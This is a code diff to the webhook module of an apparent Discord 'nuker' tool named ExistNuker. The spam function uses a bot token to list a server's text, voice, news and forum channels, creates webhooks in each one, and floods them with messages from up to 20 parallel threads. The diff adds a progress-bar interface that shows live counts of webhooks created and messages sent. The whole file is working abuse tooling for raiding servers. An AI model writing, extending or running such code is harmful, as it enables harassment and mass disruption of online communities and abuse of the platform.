@@ -1,8 +1,9 @@
 """
 Webhook Operations Module
-Handles Discord webhook operations
-Creates webhooks and starts spamming immediately (parallel)
-Supports custom name and avatar with validation
+- Handles Discord webhook operations
+- Creates webhooks and starts spamming immediately (parallel)
+- Supports custom name and avatar with validation
+- Live Status Updates (Created/Sent counts)
 Cross-platform with connection pooling
 """
 
@@ -12,6 +13,7 @@ import queue
 from discord_api import make_request, get_session
 from config import Colors, THREADS, stop_event
 import channels
+from interface import ui
 
 # Default webhook settings
 DEFAULT_WEBHOOK_NAME = "ExistNuker"
@@ -115,108 +117,108 @@ def get_or_create_webhook(token, channel_id, channel_name, webhook_name):
 def spam(token, guild_id, content, amount_per_channel, webhook_name=None, avatar_url=None, thread_count=THREADS, stop_event=None):
     """
     Spam messages - starts spamming immediately as webhooks are created
-    
-    Args:
-        token: Bot token
-        guild_id: Guild ID
-        content: Message content
-        amount_per_channel: Messages per channel
-        webhook_name: Custom webhook name (optional)
-        avatar_url: Custom avatar URL (optional, validated)
-        thread_count: Number of threads
-        stop_event: Stop event for Ctrl+C
     """
     # Use defaults if not provided
     name = webhook_name if webhook_name else DEFAULT_WEBHOOK_NAME
     avatar = avatar_url if avatar_url else DEFAULT_WEBHOOK_AVATAR
     
-    print(f"{Colors.CYAN}Fetching channels...{Colors.RESET}")
-    all_channels = channels.get_all(token, guild_id)
-    
+    with ui.status_spinner("Fetching channels..."):
+        all_channels = channels.get_all(token, guild_id)
+        
     target_channels = [c for c in all_channels if c.get('type', 0) in [0, 2, 5, 13]]
     
     if not target_channels:
-        print(f"{Colors.YELLOW}No channels found{Colors.RESET}")
+        ui.print_warning("No channels found")
         return 0
     
-    print(f"{Colors.CYAN}Found {len(target_channels)} channels{Colors.RESET}")
-    print(f"{Colors.CYAN}Webhook Name: {name}{Colors.RESET}")
-    print(f"{Colors.CYAN}Avatar: {avatar[:50]}...{Colors.RESET}")
-    print(f"{Colors.GREEN}Creating webhooks & spamming simultaneously...{Colors.RESET}\n")
+    ui.print_info(f"Found {len(target_channels)} channels")
+    ui.print_info(f"Webhook Name: {name}")
+    ui.print_info(f"Spamming {amount_per_channel} messages per channel")
     
     webhook_queue = queue.Queue()
     sent = [0]
-    created = [0]
+    created_count = [0]
+    failed_create = [0]
     done_creating = [False]
     lock = threading.Lock()
     
-    def spam_worker():
-        while True:
-            if stop_event and stop_event.is_set():
-                return
-            
-            try:
-                wh = webhook_queue.get(timeout=0.5)
-            except queue.Empty:
-                if done_creating[0] and webhook_queue.empty():
-                    return
-                continue
-            
-            for _ in range(amount_per_channel):
+    with ui.progress_bar(description="Webhook Spam...") as progress:
+        create_task = progress.add_task("[cyan]Creating Webhooks...", total=len(target_channels))
+        spam_task = progress.add_task("[magenta]Sending Messages...", total=len(target_channels) * amount_per_channel)
+        
+        def spam_worker():
+            while True:
                 if stop_event and stop_event.is_set():
                     return
                 
-                if send(wh['url'], content, name, avatar):
-                    with lock:
-                        sent[0] += 1
-                    if sent[0] % 20 == 0:
-                        print(f"{Colors.GREEN}Sent {sent[0]} messages...{Colors.RESET}")
+                try:
+                    wh = webhook_queue.get(timeout=0.5)
+                except queue.Empty:
+                    if done_creating[0] and webhook_queue.empty():
+                        return
+                    continue
                 
-                if stop_event.wait(0.03):
-                    return
-            
-            webhook_queue.task_done()
-    
-    def create_worker():
-        for channel in target_channels:
-            if stop_event and stop_event.is_set():
-                break
-            
-            channel_id = channel.get('id')
-            channel_name = channel.get('name', 'unknown')
-            
-            webhook_url = get_or_create_webhook(token, channel_id, channel_name, name)
-            if webhook_url:
-                with lock:
-                    created[0] += 1
-                print(f"{Colors.CYAN}[{created[0]}/{len(target_channels)}] Ready: #{channel_name}{Colors.RESET}")
+                for _ in range(amount_per_channel):
+                    if stop_event and stop_event.is_set():
+                        return
+                    
+                    if send(wh['url'], content, name, avatar):
+                        with lock:
+                            sent[0] += 1
+                            if sent[0] % 10 == 0:
+                                progress.update(spam_task, advance=10, description=f"[magenta]Sent: {sent[0]} | Target: {len(target_channels)*amount_per_channel}")
+                            else:
+                                progress.update(spam_task, advance=1)
+                    else:
+                         progress.update(spam_task, advance=1)
+                    
+                    if stop_event.wait(0.03):
+                        return
                 
-                webhook_queue.put({
-                    'url': webhook_url,
-                    'channel_name': channel_name
-                })
-            else:
-                print(f"{Colors.RED}Failed: #{channel_name}{Colors.RESET}")
-            
-            if stop_event.wait(0.05):
-                break
+                webhook_queue.task_done()
         
-        done_creating[0] = True
+        def create_worker():
+            for channel in target_channels:
+                if stop_event and stop_event.is_set():
+                    break
+                
+                channel_id = channel.get('id')
+                channel_name = channel.get('name', 'unknown')
+                
+                webhook_url = get_or_create_webhook(token, channel_id, channel_name, name)
+                if webhook_url:
+                    with lock:
+                        created_count[0] += 1
+                        progress.update(create_task, advance=1, description=f"[cyan]Created: {created_count[0]} | Failed: {failed_create[0]}")
+                    
+                    webhook_queue.put({
+                        'url': webhook_url,
+                        'channel_name': channel_name
+                    })
+                else:
+                    with lock:
+                        failed_create[0] += 1
+                        progress.update(create_task, advance=1, description=f"[red]Failed: {failed_create[0]}")
+                
+                if stop_event.wait(0.05):
+                    break
+            
+            done_creating[0] = True
+        
+        producer = threading.Thread(target=create_worker)
+        producer.start()
+        
+        spam_threads = min(thread_count, 20)
+        consumers = []
+        for _ in range(spam_threads):
+            t = threading.Thread(target=spam_worker)
+            t.start()
+            consumers.append(t)
+        
+        producer.join()
+        
+        for t in consumers:
+            t.join()
     
-    producer = threading.Thread(target=create_worker)
-    producer.start()
-    
-    spam_threads = min(thread_count, 20)
-    consumers = []
-    for _ in range(spam_threads):
-        t = threading.Thread(target=spam_worker)
-        t.start()
-        consumers.append(t)
-    
-    producer.join()
-    
-    for t in consumers:
-        t.join()
-    
-    print(f"\n{Colors.GREEN}Finished! Created {created[0]} webhooks, Sent {sent[0]} messages{Colors.RESET}")
+    ui.print_success(f"Finished! Created {created_count[0]} webhooks, Sent {sent[0]} messages")
     return sent[0]
